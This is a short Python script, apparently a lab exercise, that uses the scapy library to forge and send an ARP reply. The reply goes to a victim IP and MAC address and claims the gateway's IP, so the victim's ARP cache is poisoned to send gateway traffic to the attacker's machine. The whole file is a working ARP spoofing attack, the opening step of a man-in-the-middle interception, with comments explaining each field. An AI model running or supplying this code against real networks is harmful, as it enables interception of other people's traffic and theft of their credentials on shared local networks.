import scapy.all as scapy

"""
op = set to the ARP response, 1 = request
pdst = victim IP addr
hwdst = victim MAC
psrc = set the packet source IP to gateway IP addr
"""


packet = scapy.ARP(op=2, pdst="192.168.159.133", hwdst="00:0C:29:DE:6B:09", psrc="192.168.159.2")


"""
print(packet.show())
print(packet.summary())
summarize the packet generate above
"""
scapy.send(packet) # command change the default gateway IP to attacker MAC addr
